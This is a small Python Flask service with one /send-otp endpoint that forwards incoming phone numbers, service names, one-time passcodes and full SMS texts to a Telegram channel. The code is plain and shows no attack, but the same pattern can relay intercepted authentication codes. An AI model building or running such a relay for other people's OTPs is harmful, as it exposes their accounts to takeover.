import os
import requests
from flask import Flask, request
from datetime import datetime
from telegram import Bot

app = Flask(__name__)
bot_token = os.environ.get("BOT_TOKEN")
channel = os.environ.get("CHANNEL_USERNAME")

bot = Bot(token=bot_token)

@app.route("/send-otp", methods=["POST"])
def send_otp():
    data = request.json
    number = data.get("number")
    service = data.get("service")
    code = data.get("code")
    full_sms = data.get("full_sms")
    now = datetime.now().strftime("%d-%m-%Y %I:%M:%S %p")

    message = f"""✨ New OTP Received ✨

📞 Number: {number}
🔧 Service: {service}
⏰ Time: {now}

🔑 OTP Code: {code}

📩 Full SMS: 
{full_sms}
"""
    bot.send_message(chat_id=channel, text=message)
    return {"status": "sent"}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
